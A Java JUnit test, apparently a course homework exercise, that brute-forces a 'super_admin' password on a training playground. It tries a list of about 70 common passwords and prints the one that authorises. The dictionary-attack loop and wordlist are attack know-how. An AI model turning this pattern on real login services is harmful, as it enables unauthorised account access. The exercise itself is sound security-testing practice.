package tests;

import io.restassured.response.Response;
import lib.ApiCoreRequests;
import lib.Assertions;
import lib.BaseTestCase;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.HashMap;
import java.util.Map;

public class Ex9FindPasswordTest extends BaseTestCase {

    private final ApiCoreRequests apiCoreRequests = new ApiCoreRequests();
    private final String urlAuth = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    private final String urlCheckCookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

    @ParameterizedTest
    //Passwords from wiki sorted and duplicates are removed
    @ValueSource(strings = {
            "!@#$%^&*", "000000", "111111", "121212", "123123", "1234", "12345", "123456", "1234567", "12345678",
            "123456789", "1234567890", "123qwe", "1q2w3e4r", "1qaz2wsx", "555555", "654321", "666666", "696969",
            "7777777", "888888", "aa123456", "abc123", "access", "admin", "adobe123", "ashley", "azerty", "bailey",
            "baseball", "batman", "charlie", "donald", "dragon", "flower", "football", "freedom", "hello", "hottie",
            "iloveyou", "jesus", "letmein", "login", "lovely", "loveme", "master", "michael", "monkey", "mustang",
            "ninja", "passw0rd", "password", "password1", "photoshop", "princess", "qazwsx", "qwerty", "qwerty123",
            "qwertyuiop", "shadow", "solo", "starwars", "sunshine", "superman", "trustno1", "welcome", "whatever",
            "zaq1zaq1"})

    public void testFindPassword(String password) {
        Map<String,String> authData = new HashMap<>();
        authData.put("login", "super_admin");
        authData.put("password", password);

        Response responseGetCookie = apiCoreRequests
                .makePostRequest(urlAuth, authData);
        String cookie = responseGetCookie.getCookie("auth_cookie");

        Response responseCheckCookie = apiCoreRequests
                .makePostRequestCookie(urlCheckCookie, cookie);

        Assertions.assertResponseTextEquals(responseCheckCookie, "You are authorized");
        System.out.println("Your password: " + password);
    }
}
